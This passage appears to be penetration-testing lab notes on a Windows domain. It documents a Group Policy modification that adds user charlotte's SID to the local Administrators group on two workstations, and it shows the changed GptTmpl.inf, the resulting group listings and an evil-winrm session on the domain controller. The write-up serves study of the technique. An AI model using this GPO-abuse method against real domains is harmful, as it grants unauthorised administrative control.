net localgroup "Administrators"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
SECURA\Domain Admins
The command completed successfully.
```

Downloaded GPT.INI and GptTmpl.inf from the SMB policy folder:
```
cat GPT.INI 
[General]
Version=196678

cat GptTmpl.inf                                                                                                                                                                                                                     1 ↵
��[Unicode]
Unicode=yes
[System Access]
PasswordComplexity = 0
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Version]
signature="$CHICAGO$"
Revision=1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
```

### After GPO update

Run `gpupdate /force` on both workstations.

On VM01:
```
net localgroup "Administrators"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
SECURA\charlotte
The command completed successfully.
```
=> charlotte is now local admin (somehow eric is no longer lol)

On VM02:
```
net localgroup "Administrators"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
SECURA\charlotte
The command completed successfully.
```
=> charlotte is now local admin


Downloaded GPT.INI and GptTmpl.inf from the SMB policy folder:
```
cat GPT.INI 
[General]
Version=196679

cat GptTmpl.inf 
[Unicode]
Unicode=yes
[System Access]
PasswordComplexity = 0
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Version]
signature="$CHICAGO$"
Revision=1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Group Membership]
*S-1-5-32-544__Memberof =
*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104
```

The version number increased and the group membership section was added:
```
[Group Membership]
*S-1-5-32-544__Memberof =
*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104
```

**`S-1-5-32-544`**: This is the well-known SID for the **BUILTIN\Administrators** (Local Administrators) group.
**S-1-5-21-3453094141-4163309614-2941200192-1104**: This is the SID of charlotte (see below)

evil-winrm session as charlotte on DC01:
```
whoami /user

USER INFORMATION
----------------

User Name        SID
================ ==============================================
secura\charlotte S-1-5-21-3453094141-4163309614-2941200192-1104
```